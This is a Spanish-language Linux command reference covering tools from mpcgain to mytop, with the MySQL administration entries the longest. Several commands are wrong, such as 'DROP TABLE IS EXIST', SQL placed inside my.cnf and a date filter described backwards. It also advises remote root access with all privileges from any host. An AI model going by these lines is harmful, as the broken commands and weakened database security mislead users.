$ mpcgain -s audio.mpc (solo mostrar información sin modificar)
$ mpccut audio.mpc salida.mpc 30 90 (cortar desde segundo 30 hasta el 90)
$ mpccut audio.mpc intro.mpc 0 60 (extraer primeros 60 segundos)
$ mpccut audio.mpc resto.mpc 120 -1 (cortar desde minuto 2 hasta el final)
$ mpcchap audio.mpc --import capitulos.txt (añadir capítulos desde archivo de texto)
$ wavcmp -v audio1.wav audio2.wav (verificar conversión sin pérdidas)
Ejemplo de archivo:
$ nano capitulos.txt
       00:00:00 Introducción
       00:03:45 Primer tema
       00:12:30 Segundo tema
       00:25:00 Conclusión
$ mpcchap audio.mpc --export (exportar información de capítulos)
$ mpcchap audio.mpc --remove (eliminar capítulos)
$ mpc2sv8 archivo_viejo.mpc archivo_nuevo.mpc (convierte archivos Musepack antiguos [SV7] al formato actual [SV8])
1.-
Comparar original con decodificado para verificar la calidad de codificación:
$ mpcdec audio.mpc test.wav
$ wavcmp original.wav test.wav


music123
Reproductor de música.
$ music123 tema.mp3
$ music123 tema1.mp3 tema2.wav tema3.ogg (Reproducir varios títulos)
$ music123 -z -r . (Reproducir todos los temas del presente directorio [r .] de forma aleatoria [z])
$ music123 -Z -q -r /rock (Reproducir sin fin [Z] el directorio especificado y sin mostrar salida en la consola [q])
$ music123 -d 2 -r . (esperar 2 segundos entre tema y tema)
$ music123 -r /rock tema1.mp3 /folk tema2.wav (Reproducir dos temas de dos directorios distintos)


mussh
[Multi User Secure SHell]. Es un script de shell que permite ejecutar un comando o script por SSH en varios hosts con un solo comando desde tu máquina local. Su objetivo principal es ahorrar tiempo y esfuerzo al evitar tener que conectarse manualmente a cada servidor uno por uno. Siempre que sea posible, aprovecha el agente SSH [ssh-agent] y claves RSA/DSA para autenticación sin necesidad de ingresar la contraseña repetidamente en cada conexión..
$ mussh -h servidor1.example.com servidor2.example.com servidor3.example.com -c "uptime" (conectar a tres hosts y ejecutar el comando uptime en los 3)
$ mussh -A -h servidor1.example.com servidor2.example.com servidor3.example.com -c "uptime" (lo mismo pero ingresando la contraseña en cada host)
$ echo -e "hostA\nhostB" | mussh -H - -i ~/.ssh/clave_privada -c "ps aux | grep apache" -d 1 (lee hosts de stdin, usa una clave específica, ejecuta el comando y muestra debug básico)
$ mussh -a -h web1 web2 db1 -c "echo 'Iniciando backup'" -C /ruta/backup_script.sh -c "echo 'Backup completado'" -m -b -d 2 (fuerza un agente propio [-a], ejecuta comandos inicial/final + script, en paralelo pero con salida secuencial [-m -b], y debug detallado [0=off, 1=básico, 2=detallado])
1.-
Usando lista de hosts desde archivo a host por línea [los comentarios precedidos por # no son leidos]:
$ nano mis_hosts.txt
       # Servidores de producción
       prod1.example.com
       prod2.example.com
       # Otro servidor
       staging.example.com
$ mussh -H mis_hosts.txt -c "df -h /var/log" (corre "df -h /var/log" en los tres hosts listados en mis_hosts.txt)
2.-
Ejecutando un script desde archivo en paralelo:
$ nano actualizar.sh
       #!/bin/bash
       apt update
       apt upgrade -y
$ mussh -h host1 host2 host3 -C actualizar.sh -m (ejecuta el script en paralelo [-m] en los 3 hosts)
$ mussh -H mis_hosts.txt -C actualizar.sh -m (los mismo entrando el archivo de hosts. -m ejecuta el script en paralelo)
Notas.- Si un host falla, mussh continúa con los demás y los argumentos pueden ir en cualquier orden.


mussort
Herramienta diseñada para organizar grandes colecciones de música de forma automática, basada en los metadatos [etiquetas ID3, MP3, Ogg Vorbis y FLAC] de los archivos de audio y procesándolos uno por uno. Luego, lee la información del archivo y los coloca en un árbol de directorios recién ordenado.
$ mussort -d ~/Música/desordenada -o ~/Música/organizada (organizar música en la estructura Artista/Álbum/Pista - Título.mp3 con un directorio de entrada y uno de salida)
$ mussort -d ~/Música/desordenada -o ~/Música/organizada --dry-run (ver qué cambios hará mussort sin mover realmente los archivos)
$ mussort -d ~/Música/desordenada -o ~/Música/organizada --ignore-missing (ignorar archivos sin metadatos completos)
$ mussort -d ~/Música/desordenada -o ~/Música/organizada --format "%a - %t" (que los archivos se nombren como `Artista - Título.mp3` en lugar de incluir el número de pista y el álbum)
Otros formatos;
      %a --> Artista
      %t --> Título
      %b --> Álbum
      %n --> Número de pista
      %y --> Año
Notas.- Por defecto, mussort mueve los archivos. Si se prefiere copiarlos, usar "--copy". Si los archivos o tienen metadatos correctos no podrás organizarse correctamente.


mutagen-inspect
Muestra información sobre un archivo de audio y sus etiquetas. Está pensado principalmente como herramienta de depuración para Mutagen que es un módulo de Python para manejar metadatos de audio.
$ mutagen-inspect audio.mp3


mutool
[mupdf-tool] Muestra información y caracteristicas de un pdf.
$ mutool info file.pdf (caracteristicas del pdf)
$ mutool show file.pdf (muestra información del pdf)
$ mutool extract file.pdf (extrae las imágenes)
$ mutool show file.pdf (mostrar objetos internos del pdf)
$ mutool clean file.pdf (reescribe el pdf con salida out.pdf)


mutt
Gestión del correo por consola
$ nano /home/usuario/.muttrc
y añadir:
	set imap_user = 'tu-correo@gmail.com'
	set imap_pass = 'contraseña'
	set spoolfile = imaps://imap.gmail.com:993/INBOX
	set folder = imaps://imap.gmail.com:993
	set record=”imaps://imap.gmail.com/[Gmail]/Sent Mail”
	set postponed=”imaps://imap.gmail.com/[Gmail]/Drafts”
	set header_cache=”~/.mutt/cache/headers”
	set message_cachedir=”~/.mutt/cache/bodies”
	set certificate_file=~/.mutt/certificates
Guardar.
# mutt  (Para arrancar la aplicación en ncurses)
$ echo | mutt -a paquete.tar.gz -s 'el paquete' -c juanito@gmail.com -b pedrito@correo.com  (enviar un paquete[-a], asunto[-s], otro destinatario[cc] y otro en copia oculta[bcc]
$ mutt -s "asunto" destinatario@correo.com <<< "mensaje a enviar"
$ echo "Esto es una prueba" | mutt  -s 'asunto' destinatario@correo.com
$ cat texto.txt | mutt -s "asunto" destinatario@correo.com


muttdown
Es un sustituto de sendmail diseñado para el cliente de correo electrónico mutt. Este compila de forma transparente correos de texto sin formato en HTML utilizando el estándar Markdown.
$ echo "Hola, mundo!" | muttdown -s "Asunto" -r "destinatario@example.com" (compilará el texto "Hola, mundo!" en HTML y lo enviará como correo electrónico)
$ echo "# Título de la nota" | muttdown -s "Asunto" -r "destinatario@example.com" (creará un correo con el título en negrita usando Markdown)
$ echo "Hola, mundo!" | muttdown -s "Asunto" --to "destinatario1@example.com" --to "destinatario2@example.com" (enviando un correo con múltiples destinatarios)
$ echo "Hola, mundo!" > mensaje.txt && muttdown -s "Asunto" --to "destinatario@example.com" --attach mensaje.txt (crea mensaje.txt, lo incluye como adjunto y luego envía el correo)


mv
Mover o renombrar archivos o directorios
$ mv archivo archivo2 (renombrar "archivo" a "archivo2")
$ mv /home/usuario/index.html /var/www/  (mover archivo a otro directorio)
$ mv -i (Pide confirmación de sobreescritura si existe el archivo o directorio)
$ mv -f (Sobreescribe sin preguntar)


mwaw2epub
Este paquete contiene una utilidad para convertir archivos de documentos de texto antiguos de Mac como los creados por MacWrite, ClarisWorks [.cwk y .mwd] a documentos EPUB.
$ mwaw2epub archivo.mwd (crea un archivo llamado archivo.epub en el mismo directorio)
$ mwaw2epub archivo.cwk archivo.epub (lo mismo)


mwaw2odt
Este paquete contiene una utilidad para convertir archivos de documentos de texto antiguos de Mac como los creados por MacWrite, ClarisWorks [.cwk y .mwd] a documentos OpenDocument.
$ mwaw2odt archivo.cwk (genera un archivo llamado archivo.odt en el mismo directorio)
$ mwaw2odt archivo.mwp archivo.odt (lo mismo especificando la salida)


mwic
[misspelled words in context - palabras mal escritas en contexto]. Es un corrector ortográfico, que agrupa posibles errores ortográficos y los muestra en su contexto. Esto resulta útil para revisar documentos técnicos que suelen contener palabras no incluidas en los diccionarios estándar.
$ mwic --list-languages (listados de lenguajes del sistema)
$ mwic -l es --compact archivo.txt (en español y omitir lineas en blanco en la salida)


mycli
Alternativa moderna al cliente MySQL estándar que ofrece una experiencia mucho más agradable y productiva. Sus principales ventajas son el autocompletado inteligente, el resaltado de sintaxis y una mejor visualización de resultados.
$ mycli -u usuario -p (conexión básica)
$ mycli -h localhost -u root -D nombre_base_datos (especificar host y base de datos)
$ mycli -u usuario -pmicontraseña -D mibd (con contraseña en el comando, no recomendado en producción)
Ver mysql para la gestión de la base de datos. Los comandos especiales de mucli son:
       \? --> Ver ayuda
       \T --> Cambiar entre formatos de tabla
       \history --> Ver historial de comandos
       \e --> Editar última consulta en editor
       \. /ruta/al/archivo.sql --> Ejecutar comando desde archivo
       \u nombre_bd --> Cambiar de base de datos
       \q --> Salir
Algunas opciones útiles en el archivo de configuración:
$ nano ~/.myclirc
[main]
# Habilitar autocompletado
auto_vertical_output = True
# Formato de tabla preferido
table_format = psql
# Resaltado de sintaxis
syntax_style = native
# Guardar historial
history_file = ~/.mycli-history
# Paginador (como less)
enable_pager = True


mypager
Paginador intuitivo que añade color y formateo mejorado a los resultados de las consultas de clientes de bases de datos MySQL o PostgreSQL. Funciona como un "paginador" similar a less o more.
mysql> pager mypager (indicarle al cliente de MySQL que use mypager solo para la sesión actual)
psql> \pset pager 'mypager' (uso Temporal en la Sesión de PostgreSQL)
1.-
Configuración permanente en MySQL
$ nano ~/.my.cnf
Y agregar o modificar la sección [mysql]:
  	[mysql]
	pager = /usr/bin/mypager
2.-
Configuración permanente en PostgreSQL
$ nano ~/.psqlrc
Y agregar:
	\setenv PAGER 'mypager'


mypy
Es básicamente un linter de Python mejorado, capaz de detectar numerosos errores de programación analizando tu programa sin necesidad de ejecutarlo. Mypy cuenta con un potente sistema de tipos con funciones como inferencia de tipos, tipado gradual, genéricos y tipos de unión. En esencia, mypy puede decirte mucho sobre tu código antes de ejecutarlo, lo cual es sumamente útil para detectar errores y escribir código Python más robusto y mantenible.
$ mypy miarchivo.py (si el archivo tiene algún error en la tipología lo indicará)
1.-
Para comenzar un nuevo proyecto con el uso de tipo hints, se puede usar la herramienta poetry, gestionador de paquetes de Python, y mypy directamente. Ejemplo:
$ mkdir proyecto (crear una nueva carpeta para el proyecto)
$ cd proyecto (entrar en la carpeta)
$ poetry init (una vez instalado python3-poetry, configurar el proyecto)
Añadir mypy como dependencia
$ nano pyproject.toml
       [tool.poetry.dependencies]
       python = "3.10"
       mypy = "0.941"
       [tool.poetry.dev-dependencies]
       mypy = "0.941"
Apartir de es momento se puede ejecutar mypy en el proyecto simplemente utilizando la herramienta poetry.
$ poetry run mypy proyecto


myrepos
Herramienta para gestionar todos los repositorios de control de versiones entrados en el sistema. El comando mr permite extraer, actualizar o realizar otras acciones en un conjunto de repositorios como si fueran uno solo en lugar de ir repositorio por repositorio ejecutando comandos. Admite cualquier combinación de repositorios Git, SVN, Mercurial, BZR, Darcs, CVS, VCSH, Fossil y Veracity. Incluye la herramienta webcheckout
Imaginemos que tenemos tres repositorios en el directorio ~/projects y cada uno en un subdirectorio: proyecto1 para el repo de GIT, legacy-app para el repo Subversion y python-lib para el repo Mercurial:
$ nano  ~/.mrconfig
  	[~/projects/proyecto1]
	checkout = git clone git@github.com:usuario/proyecto1.git
	[~/projects/legacy-app]
	checkout = svn checkout https://svn.example.com/legacy-app/trunk
	[~/projects/python-lib]
	checkout = hg clone https://bitbucket.org/user/python-lib
$ mr update (desde el directorio que contiene .mrconfig actualizar todos los repositorios)
$ mr -c ~/.mrconfig update (si no estamos en el directorio de .mrconfig, especificar la ruta)
$ mr checkout (descarga todos los repositorios configurados)
$ mr status (ver el estado de todos los repositorios)
$ mr run git fetch (ejecutar "git fetch" en todos los repositorios Git)
$ mr run git log --oneline -3 (ejecutar "git log --oneline" en los últimos 3 commits)
$ mr log (mostrar los logs de todos los repositorios)
$ mr register (que mr detecte automáticamente repositorios en un directorio con multiples repositorios)
$ mr update proyecto1 legaxy-app (sólo operar en algunos repositorios)
$ mr update -X proyecto1 (excluir repositorios)
$ webcheckout https://bitbucket.org/atlassian/bitbucket.git (clona un repositorio desde una URL en ~/src/github.com/usuario/repositorio/)


myrescue
Es un programa que rescata datos aún legibles de discos duros, CD-ROM, DVD, unidades flash, etc., dañados. Su propósito es similar al de ddrescue [ver], pero intenta recuperar rápidamente las áreas dañadas para procesar primero la parte intacta del disco y recuperarla posteriormente.
# myrescue /dev/sdb disco_recuperado.img (intentará copiar los datos del disco dañado desmontado en la imagen)
# myrescue -T 5 /dev/sdb /dev/sdc (tiempos de espera entre reintentos [5 segundos] y los datos recuperados a un disco externo [sdc])
# myrescue -n -v /dev/sdb datos_recuperados.img (no intentar recuperar las áreas dañadas, solo las sanas y ver más detalles durante el proceso )


mysecureshell
Herramienta creada para aportar más funcionalidades al protocolo sftp/scp ofrecido por OpenSSH y ofrecer la potencia y seguridad de OpenSSH, con funciones mejoradas (como ACL) para restringir los usuarios conectados.
Crear un usuario con la shell restringida. Tambien puede hacerse desde la propia aplicaicón (ver):
	$ useradd -m -s /bin/MySecureShell USER
	$ passwd USER
$ MySecureShell --configtest (comprobacion de la configuración de un usuario)
MySecureShell viene con algunas utilidades que facilitan la administración y el control de las cuentas SFTP y del mismo MySecureShell.
$ sftp-who (muestra los usuarios SFTP que están conectados)
$ sftp-kill USER (Desconectar a un usuario)
$ sftp-state (vireficar el estado de la aplicación)
$ sftp-verif (comprueba la existencia y los permisos de los distintos archivos)
$ sftp-user list (muestra todas las cuentas de usuario habilitadas para SFTP)
$ sftp-user delete USER (eliminar una cuenta de usuario SFTP)
$ sftp-user create USER (crear un usuario)
Un ejemplo de configuración básica:
# nano /etc/ssh/sftp_config
<Group sftp>
        Download                50k     # limitar velocidad de descarga por conexión
        Upload                  0       # Velocidad de subida ilimitada por conexión
        StayAtHome              true    # limitar al usuario a su directorio home
        VirtualChroot           true    # falsifica un chroot a la cuenta de inicio
        LimitConnectionByUser   1       # conexión máxima para cada cuenta
        LimitConnectionByIP     1       # conexión máxima por IP para cada cuenta
        IdleTimeOut             300     # desconectar por inactividad (en segundos)
        HideNoAccess            true    # ocultar archivo/directorio al que el usuario no tiene acceso
</Group>


myspell-es
Diccionario de español para usar con el corrector ortográfico myspell, actualmente utilizado en OpenOffice.org y el corrector ortográfico de Mozilla.


mysql
Gestor de bases de datos [BDs]. Las BDs se guardan en el directorio /var/lib/mysql/
$ mysqldump -u root -p proveedores > fichero.sql (Crear un backup de la BD "proveedores".)
$ mysql -u root -p proveedores < fichero.sql (Restaurar la BD "proveedores" de un archivo)
$ mysqlimport -u root -p clientes fichero.sql (Otra forma de restaurar una BD si esta ya existe)
$ mysqldump -u root -p --all-databases > fichero.sql (Backup de todas las BDs)
$ mysqldump -u root -p clientes proveedores > fichero.sql (Backup de dos BDs)
$ mysqldump -u root -p proveedores --ignore-table=antiguos > fichero.sql (Backup ignorando una tabla)
$ mysqldump -u root -p base_de_datos tabla1 tabla2 > tabla1_y_tabla2.sql (Exportar solo unas tablas de una BDs)
$ mysql -u root -p1234 (Acceder a la BD con el usuario "root" y contraseña "1234"[nótese que la contraseña está junto a la "p")
$ mysql -u root -p (Pedirá contraseña para acceder a la BD con el usuario "root")
$ mysql -u root -p datos (Entrar en mysql y directamente en la BD "datos" [notese que la BDs está separada de la "p" por un espacio, sinó se tomaría como la contraseña])
Una vez en el prompt de mysql [Todas las sentencias han de terminar con un punto y coma [;] menos la sentencia "USE"]:
	mysql> SHOW VARIABLES LIKE 'datadir'; (muestra el directorio donde se almacenan las BDs)
	mysql> show databases; (Mostrar las BDs existentes)
	mysql> create database datos; (Crear la BD "datos")
	mysql> DROP DATABASE datos; (Borrar toda una base de datos. El directorio /var/lib/mysql/datos/ tiene que estar vacio)
	mysql> USE datos (Entrar en la BD "datos". Sin punto y coma final)
	mysql> show tables; (Mostrar las tablas de la BD en la que se ha entrado)
	mysql> DESCRIBE una_tabla (Mostrar los campos de una tabla concreta)
	mysql> exit (Salir de mysql. Tambien con "quid" o Ctrl+d)
	mysql> select version(), current_date; (Mostrar versión de mysql y fecha)
	mysql> SET lc_messages = 'es_ES'; (Que los mensajes de error salgan en español)
Resumen de comandos:
    CREATE DATABASE (rear nueva base de datos vacía)
    DROP DATABASE (eliminar completamente una base de datos existente)
    CREATE TABLE (crear nueva tabla)
    ALTER TABLE (modificar una tabla ya existente)
    DROP TABLE (eliminar por completo una tabla existente)
    SELECT (leer o seleccionar datos)
    INSERT (añadir o insertar nuevos datos)
    UPDATE (cambiar o actualizar datos existentes)
    DELETE (eliminar o borrar datos existentes)
    REPLACE (añadir, cambiar o reemplazar datos nuevos o ya existentes)
    TRUNCATE (vaciar o borrar todos los datos de la plantilla)
Modelo de creación de una tabla dentro de una BD mysql:
Nota: en caso de equivocación podemos suspender la entrada de datos con \\n . Si existe alguna comilla abierta, primero ha de cerrarse antes de lanzar \\n
    mysql> CREATE TABLE usuarios(
    -> nombre VARCHAR(20), apellido VARCHAR(20),
    -> profesión VARCHAR(20), sexo CHAR(1), nacimiento DATE,
    -> antiguedad DATE);
VARCHAR(20) (Que los valores que se almacenarán son de longitud variable de hasta 20 caracteres)
CHAR(1) (Que el valor será fijo y solo tendrá un caracter)
DATE (En formato YYYY-MM-DD)
Para entrar datos en la tabla anterior, podemos crear un archivo de texto "usuarios.txt" que contenga un registro por línea con valores separados por tabuladores, cuidando que el orden de las columnas sea el mismo que utilizamos en la sentencia CREATE TABLE. Para valores que no conozcamos podemos usar valores nulos usando \N. Ejemplo:
$ nano usuarios.txt
	Juan	Borras	contable	m	1964-05-12	1988-03-27
	Maria	Gil	administrativo	f	1983-10-03	2004-08-05
	Antonio Gomez	portero		m	\N		2006-11-01
Nota.- El final del archivo no ha de contener ninguna linea en blanco. El archivo tiene que estar en /var/lib/mysql/datos (En el directorio de la misma base de datos donde se carga)
Para cargarlo en la BD:
	mysql> LOAD DATA INFILE "usuarios.txt" INTO TABLE datos;
Nota.- En caso de que salga el error: The used command is not allowed with this MySQL version:
	# nano /etc/mysql/my.cnf
	Y en la sección [mysql] añadir la linea "local-infile":
		[mysql]
		local-infile
	Reinciar mysql.
LOAD DATA (Permite especificar cuál es el separador de columnas y el separador de registros. Por defecto el tabulador es el separador de columnas (campos) y el salto de línea es el separador de registros)
Para añadir un nuevo registro a la BD anterior:
	mysql> INSERT INTO usuarios
	    -> VALUES('Jose','Robles','administrativo','m',NULL,'2012-12-01');
Valores y fechas entre comillas simples y valores desconocidos NULL y no \N como entrando un archivo.
	mysql> SELECT * FROM usuarios; (Ver toda la tabla para comprobar si se ha añadido el último registro)
Para modificar un registro puede realizarse borrando toda la tabla de datos y entrando nuevamente el archivo usuarios.txt si este está actualizado:
	mysql> DELETE FROM usuarios;
	mysql> LOAD DATA INFILE "usuarios.txt" INTO TABLE usuarios;
O modificando solo el registro que corresponda:
	mysql> UPDATE usuarios SET nacimiento="1959-04-12" WHERE apellido="Gomez"; (Modificar campo "nacimiento" del apellido "Gomez"
	mysql> SELECT * FROM usuarios WHERE apellido="Gomez"; (Verificar si se ha realizado la modificación)
	mysql> SELECT * FROM usuarios WHERE nacimiento >= "1990-1-1"; (filtrar los que han nacido antes de la fecha indicada)
	mysql> SELECT * FROM usuarios WHERE profesion="administrativo" AND sexo="f"; (filtrar los administrativos de sexo femenino)
	mysql> SELECT * FROM usuarios WHERE profesion="portero" OR profesion="contable"; (filtrar porteros y contables)
	mysql> SELECT * FROM usuarios WHERE (profesion="portero" AND sexo="f")
	    -> OR (nombre = "juan" AND sexo = "m"); (Filtrar distintas opciones encerradas entre parentesis)
	mysql> SELECT apellido, nacimiento FROM usuarios;
	mysql> SELECT antiguedad FROM usuarios; (Filtrar la columna "antiguedad")
	mysql> SELECT nombre, nacimiento FROM usuarios ORDER BY nacimiento; (Ordenar por fecha nacimiento)
	mysql> SELECT * FROM la_tabla ORDER BY la_columna; (Ordenar por el número de una columna)
Incrementos en un campo:
	mysql> update instrumentos set precio=precio+10; (Incrementar todos los campos "precio" de la tabla "instrumentos" en 10)
	mysql> update instrumentos set precio=precio+10 where tipo=cuerda; (Solo incrementar en 10 el campo "precio" de la tabla "instrumentos" para los de "cuerda":)
	mysql> update instrumentos set precio=(precio+precio*0.20) where tipo='viento'; (Solo incrementar un 20% (0,2) el campo "precio" de la tabla "instrumentos" para los de "viento":)
	mysql> select nombre, precio, existencias*precio from instrumentos; (Ver de cada entrada (nombre) el precio unitario (precio) y el precio del total según las existencias:)
Otras operaciones:
	mysql> DELETE FROM usuarios WHERE nombre='Maria'; (Eliminar toda la entrada que contenga "Maria")
	mysql> DROP TABLE usuarios; (Eliminar una tabla)
	mysql> DROP TABLE IS EXIST usuarios; (Eliminar tabla si existe)
	mysql> CHECK TABLE la_tabla EXTENDED; (Chequear la integridad de una tabla)
	mysql> REPAIR TABLE la_tabla; (Reparar una tabla)
1.-
En ciertos casos, para resolver el error: mysqldump: Got error: xxxx: Table 'xxxxxxxxx' doesn't exist when using LOCK TABLES:
$ mysqldump -u root -p BDs --single-transaction > dump.sql
2.-
Otro sistema para importar una base de datos. Primero crearla, entrar en ella y ejecutar el source sobre el fichero sql:
	mysql> CREATE DATABASE datos;
	mysql> USE datos;
	mysql> SOURCE datos.sql;
3.-
Exportar una tabla a txt con determinado formato:
	mysql> SELECT * FROM tabla INTO OUTFILE "tabla.txt"
	   --> FIELDS TERMINATED BY '   '
	   --> LINES TERMINATED BY '\n\n\r';
FIELDS TERMINATED BY '  ' (indica que los campos de cada línea terminarán con dos espacios.
LINES TERMINATED BY '\n\n\r '(indica el carácter como acaba cada linea, en este caso dos saltos de línea y retorno de carro
otras instrucciones de formato:
ENCLOSED BY '"' (Que los campos de tipo char, text, binary y enum de cada línea se entrecomillan)
IGNORE 1 LINES (No cargar la primera línea del fichero de texto)
LINES STARTING BY '---' (Que todas las líneas empiezen con "---".
4.-
Ejemplo parecido al anterior pero ordenando el fichero por el segundo campo:
	mysql> SELECTC campo1,campo2,campo3 FROM tabla ORDER BY campo2 INTO OUTFILE "campos.txt"
	--> FIELDS TERMINATED BY ' '
	--> LINES TERMINATED BY '\n\r';
5.-
Gestion de usuarios.
Cuando creamos un nuevo usuario en MySQL, éste queda identificado por su nombre de usuario más el nombre o IP del ordenador desde el cual hemos dicho que accederá (el carácter comodín '%' representa varios ordenadores).
Ejemplos:
     juan
     juan@'%'
     juan@localhost
     juan@'192.168.1.%'
     juan@'%.dominio.org'
Operaciones con usuarios:
	mysql> SELECT User,Host,Password FROM mysql.user; (Ver los usuarios)
	mysql> CREATE USER juan@'%' IDENTIFIED BY '1234'; (Crear un usuario con la contraseña 1234)
	mysql> CREATE USER john IDENTIFIED BY '1234', peter IDENTIFIED BY '4321'; (Crear dos usuarios)
	mysql> RENAME USER john TO juan, peter TO pedro;
	mysql> DROP USER juan, pedro; (Borrar dos usuarios)
	mysql> SET PASSWORD FOR juan = PASSWORD('abcde') (Cambiar la contraseña de un usuario)
	mysql> SHOW GRANTS FOR pedro; (Ver los privilegios de un usuario)
	mysql> GRANT ALL ON *.* TO juan@localhost (Otorgar todos los privilegios a un usuario)
	mysql> REVOKE ALL ON *.* FROM juan@localhost; (Anular todos los privilegios de un usuario)
6.-
Acceso remoto a mysql con el usuario root:
# nano /etc/mysql/my.cnf
Comentar la linea:
	#bind-address           = 127.0.0.1
Reiniciar el servicio:
# /etc/init.d/mysql restart
Entrar en el prompt de mysql y otorgar privilegios:
# mysql -u root -p
Entrar la contraseña y:
	mysql> GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'la_contraseña' WITH GRANT OPTION;
	mysql> FLUSH PRIVILEGES;
	mysql> exit
7.-
Solucionar:ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
# /etc/init.d/mysql stop (Detener el servicio)
# mysqld_safe --user=mysql --skip-grant-tables (Saltar privilegios de MySQL)
$ mysql (En otra terminal entrar en MySQL)
	mysql> use mysql (Enrar en la BDs mysql)
	mysql> UPDATE user SET Password=PASSWORD('12345') WHERE user='root';(Actualizar el campo Password del usuario root)
	mysql> exit (Salir)
$ mysql -u root -p (Entrar en MySQL)
8.-
Solucionar error: ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
# nano /etc/mysql/my.cnf
Y en el apartado mysqld añadir la linea:
	secure-file-priv = ""
9.-
Modificar el promt de mysql
Si solo se desea modificar para la presente sesión, puede hacerse directamente desde el prompt de mysql:
	mysql> prompt \h [\d]>\_
	PROMPT set to '\h [\d]> '
	localhost [(none)]>
Para hacerlo permanente:
# nano /etc/mysql/my.cnf
Y en la sección [mysql] añadimos:
	prompt=\h [\d]>\_
Variables genéricas:
    \S muestra un punto y coma
    \' muestra comillas simples
    \" muestra comillas dobles
    \v muestra la versión del servidor
    \p muestra el puerto de conexión
    \\ Muestra una barra invertida
    \n Inserta un salto de linea
    \t Inserta una fabulación
    \ Inserta un espacio (debe haber un espacio en blanco después de \ )
    \_ Inserta un espacio (debe haber un _ después de \ )
    \d Muestra la base de datos por defecto
    \h Muestra el nombre del servidor
    \c Muestra un contador de sentencias ejecutadas. Continua aumentando a medida que introducimos comandos.
    \u Muestra el usuario
    \U Muestra el nombre de la cuenta de usuario en el formato usuario@servidor
10.-
Solucionar error: ERROR 1290 (HY000): The MariaDB server is running with the --skip-grant-tables option so it cannot execute this statement
mysql> flush privileges;
11.-
Colocar un contador de registros en una tabla. Incluir las lineas id_image... y PRIMARY KEY...:
    mysql> CREATE TABLE usuarios(
	-> id_image INT(3) NOT NULL AUTO_INCREMENT,
    -> nombre VARCHAR(20), apellido VARCHAR(20),
    -> profesión VARCHAR(20), sexo CHAR(1), nacimiento DATE,
    -> antiguedad DATE),
	-> PRIMARY KEY (id_image)
	-> );
12.-
Aumentar la seguridad de un servidor mysql
# nano /etc/mysql/my.cnf
Y modificar las siguientes lineas dejándolas:
	bind-address=127.0.0.1
	[mysqld]
	local-infile            = 0
	secure-file-priv        = /dev/null
	update mysql.user set user="USER" where user="root";
	flush privileges;
La primera linea indica que el servidor MySQL solo reciba conexiones de localhost. Las tres siguientes evitan la lactura de los ficheros de configuración. Las dos siguientes renombran al usuario root con el nombre que digamos, que colocaremos donde poner "USER"
Tambien es interesante realizar consultas para ver los privilegios de los usuarios y sus permisos dentro del prom de mysql:
	> select distinct(grantee) from information_schema.user_privileges;
Si solo queramos ver los permisos de un usuario:
	> show grants for 'root'@'localhost';
Otra herramienta importante es el script "mysql_secure_installation", el cual nos ayuda a eliminar usuarios anónimos, establecer una contraseña al administrador, eliminar las bases de datos de pruebas, habilitar o deshabilitar el acceso remoto del usuario administrador, etc.
$ sudo mysql_secure_installation


mysql_secure_installation
Mejorar la seguridad de la instalación de MariaDB. Este programa permite establecer contraseña para las cuentas,  puede eliminar el acceso remoto, eliminar cuentas anónimas y puede eliminar bases de datos de prueba, a las que los usuarios anónimos pueden acceder de forma predeterminada.
$ mysql_secure_installation


mysql2dbf
Toma los datos de una tabla de MySQL y los vuelca a un archivo en formato DBF.
$ mysql2dbf -u usuario -p contraseña -d mi_base_de_datos -t clientes clientes_exportado.dbf (Una tabla llamada clientes en la base de datos mi_base_de_datos y se exportaa a un archivo DBF llamado clientes_exportado.dbf)


mysqladmin
Cliente mysql para realizar operaciones administrativas.
$ mysqladmin -u root -p version (Conocer la versión instalada)
$ mysqladmin -u root password 1234 (Establecer un primera contraseña si no la establece al instalar)
$ mysqladmin -u root -p1234 password 'abcd'(Cambiar la contraseña 1234 por abcd)
$ mysqladmin -u root -p create BASE_DATOS (Crear una base de datos)
$ mysqladmin -u root -p drop BASE_DATOS (Borrar una base de datos)
$ mysqladmin -u root -p status (Mostrar conexiones del servidor mysql)
$ mysqladmin -u root -p reload (Recargar privilegios)
$ mysqladmin -u root -p flush-logs (Vuelca todos los logs)
$ mysqladmin -u root -p flush-tables (Vuelca todas las tablas)
$ mysqladmin -u root -p shutdown (Para el servidor de forma segura)
$ mysqladmin -u root -p ping (Readlizar un ping al servidor mysql)


mysqlreport
Crea un informe de importantes valores del estado de MySQL. Interpreta y formatea los valores y presenta los valores básicos y muchos más valores inferidos en un formato legible por humanos.
# mysqlreport --user root (del usuario root)
# mysqlreport --outfile archivo (vuelca los datos en "archivo")


mysqlshow
Mstrar información de la base de datos, tablas y columnas.
# mysqlshow
# mysqlshow --count (Muestra el número de filas por tabla)
# mysqlshow --debug-info (Muestra información de la memoria y las estadísticas de uso de la CPU)


mysqltuner
Optimiza el sistema para que el motor de las bases de datos (mysql o mariadb) sean más rápidos. En primer lugar preparamos el contexto creando el directorio y descargando el script y archivos necesarios:
$ mkdir mysqltuner
$ cd mysqltuner
$ wget http://mysqltuner.pl/ -O mysqltuner.pl
$ wget https://raw.githubusercontent.com/major/MySQLTuner-perl/master/basic_passwords.txt -O basic_passwords.txt
$ wget https://raw.githubusercontent.com/major/MySQLTuner-perl/master/vulnerabilities.csv -O vulnerabilities.csv
	$ ls
	basic_passwords.txt  mysqltuner.pl  vulnerabilities.csv
Otorgamos permisos de ejecución al script de perl:
$ chmod +x mysqltuner.pl
Ejecutamos:
# ./mysqltuner
Nos pedirá nombre de usuario mysql o de mariadb y contraseña y mostrará el informe.


mysqmail
Es un conjunto de pequeños registradores [loggers] de datos para servidores de correo y FTP que guardan la información de tráfico en una base de datos MySQL. La información se divide por dominio y por usuario para facilitar la medición de todo el tráfico de un dominio determinado en tiempo real. Este paquete proporciona la infraestructura de configuración.


mytop
Monitorización del servidor de bases de datos mysql. "q" para salir. Comprobar la actividad ingresando en otra consola en mysql [mysql -u USER -p]
$ mytop -u USER -p PASS -h localhost -P 3306 --color (Especificando host y puerto)
Para no poner la contraseña y que quede reflejada en el historial, es preferible entrar los datos en un archivo:
$ nano .mytop
Con los siguientes parámetros:
	user=USER
	pass=PASS
	host=localhost
	db=
	delay=3
	port=3306
	batchmode=0
	header=1
	color=1
	idle=1
Delay=3 (Refrescar informe cada 3 segundos)
